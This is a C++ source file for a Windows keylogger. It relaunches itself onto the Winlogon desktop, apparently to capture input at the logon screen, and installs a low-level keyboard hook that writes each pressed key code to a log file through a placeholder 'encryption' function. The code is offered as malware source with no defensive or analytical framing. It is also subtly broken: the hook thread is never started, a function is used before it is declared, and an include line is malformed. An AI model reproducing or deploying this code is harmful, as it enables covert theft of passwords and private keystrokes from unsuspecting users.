#undef UNICODE
#define WIN32_LEAN_AND_MEAN

#include "windows.h"
#include "shlwapi.h""
#include <iostream>
#include <string>
#include <thread>

HANDLE Log;

#define PATH "PATH\\TO\\FILE"
DWORD WrittenBytes;

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR lpCmdLine, int nCmdShow){

    Sleep(5000);

    CreateMutexA(0, FALSE, "Local\\$MirrorFlower$");
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        return 0;
    }

    char PathToFile[MAX_PATH];
    GetModuleFileNameA(GetModuleHandle(NULL), PathToFile, sizeof(PathToFile));
    std::string::size_type pos = std::string(PathToFile).find_last_of("\\/");
    std::string CurrentDir = std::string(PathToFile).substr(0, pos);
    char Args[100] = "rebooted";

    if (StrStrA(GetCommandLineA(), "rebooted") == NULL)
    {
        STARTUPINFOA startupInfo;
        ZeroMemory(&startupInfo, sizeof(startupInfo));
        startupInfo.cb = sizeof(startupInfo);
        PROCESS_INFORMATION processInfo;
        ZeroMemory(&processInfo, sizeof(processInfo));

        char desktop[] = "WINSTA0\\WINLOGON";
        startupInfo.lpDesktop = desktop;

        CreateProcessA(CurrentDir.c_str(), Args, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &startupInfo, &processInfo);

        return 0;
    }
    


    Log = CreateFileA(PATH, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_DELETE | FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);



}

LRESULT CALLBACK KeyboardThread(int nCode, WPARAM wParam, LPARAM lParam)
{
    BOOL fEatKeystroke = FALSE;
    KBDLLHOOKSTRUCT* keyboard = (KBDLLHOOKSTRUCT*)lParam;
    if (nCode == HC_ACTION)
    {
        switch (wParam)
        {
        case WM_KEYDOWN:

            WriteFile(Log, Encode(std::to_string(keyboard->vkCode)).c_str(), (DWORD)strlen(Encode(std::to_string(keyboard->vkCode)).c_str()), &WrittenBytes, NULL);

            break;
        case WM_SYSKEYDOWN:
            break;
        case WM_KEYUP:
            break;
        case WM_SYSKEYUP:
            break;
        }
    }
    return(fEatKeystroke ? 1 : CallNextHookEx(NULL, nCode, wParam, lParam));
}

void Hooker()
{
    HHOOK hhkLowLevelKybd = SetWindowsHookExA(WH_KEYBOARD_LL, KeyboardThread, 0, 0);
    MSG msg;
    while (!GetMessage(&msg, NULL, NULL, NULL)) {    //this while loop keeps the hook
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(hhkLowLevelKybd);            //unhook regardless of mutex state if the thread is forced to close

    return;
}

std::string Encode(std::string Buffer) {

    //encryption

    return Buffer;
}